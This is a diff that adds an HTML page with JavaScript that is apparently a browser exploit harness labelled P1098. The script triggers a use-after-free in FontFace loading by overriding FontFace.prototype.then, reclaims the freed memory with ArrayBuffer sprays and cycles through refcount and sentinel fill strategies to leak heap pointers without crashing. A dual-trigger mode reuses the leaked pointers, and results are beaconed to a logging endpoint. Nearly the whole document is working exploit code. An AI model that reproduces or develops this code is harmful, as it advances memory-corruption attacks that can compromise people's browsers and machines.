@@ -1,0 +1,282 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p1098</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0f;color:#c8ffc8;font:13px/1.6 monospace;padding:16px;min-height:100vh}
+#log{white-space:pre-wrap;word-break:break-all}
+.hit{color:#ff6;font-weight:bold}
+.ptr{color:#f6f;font-weight:bold}
+.fail{color:#f66}
+.ok{color:#6f6}
+.info{color:#6cf}
+.phase{color:#fff;font-size:15px;font-weight:bold;margin:8px 0}
+.strat{color:#fc6;font-size:14px;margin:6px 0}
+#prog{height:4px;background:#222;margin:8px 0;border-radius:2px}
+#bar{height:100%;background:#6f6;border-radius:2px;width:0%;transition:width 0.3s}
+</style>
+</head><body>
+<h2 style="color:#fff;font-size:16px;margin-bottom:4px">P1098: Selective fill — leak + survive</h2>
+<div id="prog"><div id="bar"></div></div>
+<div id="log"></div>
+<script>
+var L=document.getElementById('log'),bar=document.getElementById('bar');
+function log(cls,msg){var d=document.createElement('div');d.className=cls;d.textContent=msg;L.appendChild(d);L.scrollTop=L.scrollHeight;}
+function B(tag,data){try{new Image().src='/beacon.php?tag='+encodeURIComponent(tag)+'&data='+encodeURIComponent(data||'')+'&_='+Math.random();}catch(e){}}
+
+var SIZES=[64,96,128,160,192,224,256,320,384,512,768,1024,2048];
+var K=8, TARGET_BUF=37;
+
+// Strategies to test — each sets different bytes in the 192-byte buffer
+// Goal: find a fill where the engine WRITES pointers (like zero-fill) but DOESN'T crash (like refcount=1)
+var STRATEGIES=[
+  // S0: refcount=0, all pointers filled with 0x41 (small nonzero)
+  // Hypothesis: engine sees refcount=0, inits, writes pointers, but crash-path derefs find non-null → skip null deref
+  {name:'rc0-ptr-fill', desc:'refcount=0, all other qwords=0x4141414141414141',
+   fill:function(b64){for(var i=0;i<b64.length;i++)b64[i]=0x4141414141414141n; b64[0]=0n;}},
+
+  // S1: refcount=0, only +0x58 and +0x68 pre-filled with non-null (the known crash offsets)
+  // The crash in P1096 is likely from dereffing null at +0x58 or +0x68
+  {name:'rc0-5868-fill', desc:'refcount=0, +0x58/+0x68=0x4141..., rest=0',
+   fill:function(b64){for(var i=0;i<b64.length;i++)b64[i]=0n; b64[0xB]=0x4141414141414141n; b64[0xD]=0x4141414141414141n;}},
+
+  // S2: refcount=2 (already alive with extra ref), rest=0
+  // Will engine decrement refcount and still skip init?
+  {name:'rc2-zero', desc:'refcount=2, rest=0',
+   fill:function(b64){for(var i=0;i<b64.length;i++)b64[i]=0n; b64[0]=2n;}},
+
+  // S3: refcount=0, +0x08 through +0x50 = sentinel, +0x58/+0x68 = 0 (allow engine to write), rest = sentinel
+  // Hypothesis: engine inits and writes +0x58/+0x68, other sentinels prevent side-effect crashes
+  {name:'rc0-guard-5868', desc:'refcount=0, guard all EXCEPT +0x58/+0x68',
+   fill:function(b64){
+     for(var i=0;i<b64.length;i++)b64[i]=0x4141414141414141n;
+     b64[0]=0n;           // refcount=0 to trigger init
+     b64[0x58/8]=0n;      // leave +0x58 as zero for engine to write
+     b64[0x68/8]=0n;      // leave +0x68 as zero for engine to write
+   }},
+
+  // S4: two-stage — first trigger leaks, immediately pre-fill second trigger
+  // Uses TWO FontFace objects: first one crashes but we read its pointers,
+  // immediately spray a second free with those pointers + refcount=1
+  {name:'dual-trigger', desc:'Trigger A (leak) → read ptrs → Trigger B (survive with ptrs)',
+   fill:null, dual:true},
+
+  // S5: refcount=0, fill bytes 8-191 with 1 (non-zero but small)
+  {name:'rc0-ones', desc:'refcount=0, all other bytes=0x01',
+   fill:function(b64){for(var i=0;i<b64.length;i++)b64[i]=0x0101010101010101n; b64[0]=0n;}},
+
+  // S6: Just +0x00 = 0 (refcount=0), +0x08 = non-null (maybe vtable/type ptr), rest = 0
+  {name:'rc0-vtable-guard', desc:'refcount=0, +0x08=0x4141..., rest=0',
+   fill:function(b64){for(var i=0;i<b64.length;i++)b64[i]=0n; b64[1]=0x4141414141414141n;}}
+];
+
+var stratIdx=0, runCount=0;
+try{
+  var st=localStorage.getItem('p1098_state');
+  if(st){var o=JSON.parse(st);stratIdx=o.stratIdx||0;runCount=o.runCount||0;}
+}catch(e){}
+runCount++;
+
+// Reset if we've gone past all strategies
+if(stratIdx>=STRATEGIES.length){stratIdx=0;runCount=1;}
+try{localStorage.setItem('p1098_state',JSON.stringify({stratIdx:stratIdx,runCount:runCount}));}catch(e){}
+
+var S=STRATEGIES[stratIdx];
+B('P1098-BOOT','strat='+stratIdx+'|name='+S.name+'|run='+runCount);
+log('phase','Strategy '+stratIdx+'/'+STRATEGIES.length+': '+S.name+' (run #'+runCount+')');
+log('info',S.desc);
+bar.style.width=Math.round((stratIdx/STRATEGIES.length)*100)+'%';
+
+if(S.dual){
+  doDualTrigger();
+}else{
+  doSingleStrategy(S);
+}
+
+function triggerFontFace(trialN, onMapCb){
+  var styleEl=null,firedHere=false,map=null;
+  var A=new FontFace('f'+trialN,'local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(A);
+  void A.loaded;
+  styleEl=document.createElement('style');
+  styleEl.textContent="@font-face{font-family:s"+trialN+";src:local(Arial);unicode-range:U+0042;}";
+  document.head.appendChild(styleEl);
+
+  firedHere=false;
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if(firedHere)return undefined;
+      firedHere=true;
+      if(styleEl)styleEl.remove();
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      map=[];
+      for(var si=0;si<SIZES.length;si++){
+        var sz=SIZES[si];
+        for(var k=0;k<K;k++){
+          var ab=new ArrayBuffer(sz);
+          var entry={size:sz,ab:ab,view:new Uint8Array(ab),idx:si*K+k};
+          map.push(entry);
+          if(entry.idx===TARGET_BUF && onMapCb) onMapCb(entry);
+        }
+      }
+      try{document.fonts.check('1em s'+trialN);}catch(e){}
+      return undefined;
+    },
+    set:function(){}
+  });
+  document.fonts.load('1em f'+trialN+', s'+trialN,'AB').then(function(){},function(){});
+  return function(){return{map:map,fired:firedHere};};
+}
+
+function doSingleStrategy(strat){
+  var getState=triggerFontFace(0,function(entry){
+    if(typeof BigUint64Array!=='undefined'){
+      var b64=new BigUint64Array(entry.ab);
+      strat.fill(b64);
+    }
+  });
+
+  // Scan at multiple times
+  var scanTimes=[50,80,200,500,1000,2000,4000];
+  var scanCount=0,done=false;
+  for(var t=0;t<scanTimes.length;t++){
+    (function(ms,idx){
+      setTimeout(function(){
+        scanCount++;
+        var st=getState();
+        if(!st.map||!st.map.length)return;
+        var entry=st.map[TARGET_BUF];
+        if(!entry)return;
+        if(typeof BigUint64Array==='undefined')return;
+        var b64=new BigUint64Array(entry.ab);
+        var vals=[];
+        for(var qi=0;qi<b64.length;qi++){
+          var v=b64[qi];
+          if(v!==0n)vals.push('+0x'+(qi*8).toString(16)+'=0x'+v.toString(16));
+        }
+        var nz=vals.length;
+        log(nz>0?'ptr':'info','  @'+ms+'ms: nz='+nz+(vals.length>0?' '+vals.join(', '):'  (all zero)'));
+        B('P1098-SCAN','s='+stratIdx+'|ms='+ms+'|nz='+nz+'|vals='+vals.join(',').substring(0,500));
+
+        if(idx===scanTimes.length-1 && !done){
+          done=true;
+          bar.style.width=Math.round(((stratIdx+1)/STRATEGIES.length)*100)+'%';
+          log('ok','Strategy '+stratIdx+' ('+strat.name+') SURVIVED '+ms+'ms! Advancing...');
+          B('P1098-SURVIVED','s='+stratIdx+'|name='+strat.name+'|scans='+scanCount);
+          try{localStorage.setItem('p1098_state',JSON.stringify({stratIdx:stratIdx+1,runCount:0}));}catch(e){}
+          log('info','Next reload → Strategy '+(stratIdx+1));
+        }
+      },ms);
+    })(scanTimes[t],t);
+  }
+}
+
+function doDualTrigger(){
+  log('strat','Dual-trigger: Trigger A leaks pointers, Trigger B uses them');
+  log('info','Step 1: Trigger A with zero-fill (leak mode)');
+
+  var leakedPtrs=null;
+
+  // Trigger A — zero fill to get the pointer leak
+  var getA=triggerFontFace(0,function(entry){
+    // Zero fill — let engine write pointers
+    var v=entry.view;
+    for(var i=0;i<v.length;i++)v[i]=0;
+  });
+
+  // At 10ms, read pointers from trigger A, then immediately fire trigger B
+  setTimeout(function(){
+    var stA=getA();
+    if(!stA.map||!stA.map.length){B('P1098-DUAL','A-no-map');return;}
+    var entryA=stA.map[TARGET_BUF];
+    if(!entryA){B('P1098-DUAL','A-no-buf');return;}
+    if(typeof BigUint64Array==='undefined'){B('P1098-DUAL','no-bui64');return;}
+
+    var b64A=new BigUint64Array(entryA.ab);
+    var valsA=[];
+    for(var qi=0;qi<b64A.length;qi++){
+      if(b64A[qi]!==0n)valsA.push({off:qi*8,val:b64A[qi]});
+    }
+    log('ptr','Trigger A @10ms: '+valsA.map(function(v){return'+0x'+v.off.toString(16)+'=0x'+v.val.toString(16);}).join(', '));
+    B('P1098-DUAL-A','vals='+valsA.map(function(v){return'+0x'+v.off.toString(16)+'=0x'+v.val.toString(16);}).join(','));
+
+    if(valsA.length===0){
+      log('fail','Trigger A: no pointers yet at 10ms');
+      // Try again at 30ms
+      setTimeout(function(){
+        var b64A2=new BigUint64Array(entryA.ab);
+        var valsA2=[];
+        for(var qi=0;qi<b64A2.length;qi++){
+          if(b64A2[qi]!==0n)valsA2.push({off:qi*8,val:b64A2[qi]});
+        }
+        log('ptr','Trigger A @40ms: '+valsA2.map(function(v){return'+0x'+v.off.toString(16)+'=0x'+v.val.toString(16);}).join(', '));
+        B('P1098-DUAL-A2','vals='+valsA2.map(function(v){return'+0x'+v.off.toString(16)+'=0x'+v.val.toString(16);}).join(','));
+        if(valsA2.length>0) fireTriggerB(valsA2);
+        else{log('fail','No pointers from Trigger A. Process may crash.');B('P1098-DUAL-NOPTRS','');}
+      },30);
+    }else{
+      fireTriggerB(valsA);
+    }
+  },10);
+
+  function fireTriggerB(ptrs){
+    log('strat','Step 2: Trigger B with leaked pointers + refcount=1');
+    log('info','Filling: refcount=1, leaked ptrs at their original offsets');
+
+    var getB=triggerFontFace(1,function(entry){
+      var b64B=new BigUint64Array(entry.ab);
+      b64B[0]=1n; // refcount=1 to prevent crash
+      for(var qi=1;qi<b64B.length;qi++)b64B[qi]=0n;
+      // Copy leaked pointers to their original offsets
+      for(var p=0;p<ptrs.length;p++){
+        var qIdx=ptrs[p].off/8;
+        if(qIdx>0 && qIdx<b64B.length){
+          b64B[qIdx]=ptrs[p].val;
+          log('info','  +0x'+ptrs[p].off.toString(16)+' = 0x'+ptrs[p].val.toString(16));
+        }
+      }
+    });
+
+    setTimeout(function(){
+      var stB=getB();
+      if(!stB.map||!stB.map.length){B('P1098-DUAL-B','no-map');return;}
+      var entryB=stB.map[TARGET_BUF];
+      if(!entryB)return;
+      var b64B=new BigUint64Array(entryB.ab);
+      var valsB=[];
+      for(var qi=0;qi<b64B.length;qi++){
+        if(b64B[qi]!==0n)valsB.push('+0x'+(qi*8).toString(16)+'=0x'+b64B[qi].toString(16));
+      }
+      log('hit','Trigger B @80ms: '+valsB.join(', '));
+      B('P1098-DUAL-B','vals='+valsB.join(',').substring(0,500));
+    },80);
+
+    var bScans=[500,1000,2000,4000];
+    for(var t=0;t<bScans.length;t++){
+      (function(ms,idx){
+        setTimeout(function(){
+          var stB=getB();
+          if(!stB.map)return;
+          var entryB=stB.map[TARGET_BUF];
+          if(!entryB)return;
+          var b64B=new BigUint64Array(entryB.ab);
+          var valsB=[];
+          for(var qi=0;qi<b64B.length;qi++){
+            if(b64B[qi]!==0n)valsB.push('+0x'+(qi*8).toString(16)+'=0x'+b64B[qi].toString(16));
+          }
+          var nz=valsB.length;
+          log(nz>0?'ptr':'info','  Trigger B @'+ms+'ms: nz='+nz+(nz>0?' '+valsB.join(', '):''));
+          B('P1098-DUAL-B-SCAN','ms='+ms+'|nz='+nz+'|vals='+valsB.join(',').substring(0,400));
+          if(idx===bScans.length-1){
+            log('ok','Dual-trigger complete! Both survived.');
+            B('P1098-DUAL-DONE','survived=true');
+            bar.style.width='100%';
+            try{localStorage.setItem('p1098_state',JSON.stringify({stratIdx:stratIdx+1,runCount:0}));}catch(e){}
+          }
+        },ms);
+      })(bScans[t],t);
+    }
+  }
+}
+</script>
+</body></html>
